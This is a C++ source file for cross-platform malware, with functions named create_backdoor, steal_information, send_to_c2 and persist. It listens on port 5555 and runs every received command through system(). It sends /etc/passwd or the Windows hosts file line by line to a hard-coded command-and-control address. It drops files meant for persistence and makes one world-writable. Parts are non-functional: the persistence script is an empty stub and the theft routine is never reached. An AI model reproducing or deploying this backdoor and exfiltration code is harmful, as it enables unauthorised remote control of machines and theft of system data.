#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netdb.h> 

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#endif

#define PORT 5555
#define BUFFER_SIZE 1024
#define C2_SERVER "192.168.1.100" 

void create_backdoor();
void steal_information();
void send_to_c2(const char *data);
void persist();

void create_backdoor() {
    int sockfd, newsockfd;
    socklen_t clilen;
    char buffer[BUFFER_SIZE];
    struct sockaddr_in serv_addr, cli_addr;
    int n;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(PORT);

    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
        perror("ERROR on binding");
        exit(1);
    }

    listen(sockfd, 5);
    clilen = sizeof(cli_addr);

    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
    if (newsockfd < 0) {
        perror("ERROR on accept");
        exit(1);
    }

    while (1) {
        bzero(buffer, BUFFER_SIZE);
        n = read(newsockfd, buffer, BUFFER_SIZE - 1);
        if (n < 0) {
            perror("ERROR reading from socket");
            exit(1);
        }

        // Execute received command
        system(buffer);
    }

    close(newsockfd);
    close(sockfd);
}

void steal_information() {
    std::ifstream file;
#ifdef _WIN32
    file.open("C:\\Windows\\System32\\drivers\\etc\\hosts");
#else
    file.open("/etc/passwd");
#endif
    if (!file.is_open()) {
        std::cerr << "ERROR opening file." << std::endl;
        exit(1);
    }

    char buffer[BUFFER_SIZE];
    while (file.getline(buffer, BUFFER_SIZE)) {
        
        send_to_c2(buffer);
    }

    file.close();
}

void send_to_c2(const char *data) {
    int sockfd;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("ERROR opening socket");
        exit(1);
    }

    server = gethostbyname(C2_SERVER);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(1);
    }

    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
    serv_addr.sin_port = htons(PORT);

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("ERROR connecting");
        exit(1);
    }

    write(sockfd, data, strlen(data));
    close(sockfd);
}

void persist() {
#ifdef _WIN32
    std::ofstream file("C:\\Windows\\System32\\malware.exe");
    if (!file.is_open()) {
        std::cerr << "ERROR creating persistence file." << std::endl;
        exit(1);
    }

    //re-execute the malware on reboot
    file << "#!/bin/sh\n";
    file.close();

    //executable
    system("icacls C:\\Windows\\System32\\malware.exe /grant Everyone:F");
#else
    const char *persist_path = "/tmp/.malware";
    int fd = open(persist_path, O_CREAT | O_WRONLY, 0755);
    if (fd < 0) {
        perror("ERROR creating persistence file");
        exit(1);
    }

    //re-execute the malware on reboot
    const char *script = "#!/bin/sh\n";
    write(fd, script, strlen(script));
    close(fd);

    //executable
    chmod(persist_path, 0755);
#endif
}

int main() {
    persist();
    create_backdoor();
    steal_information();
    return 0;
}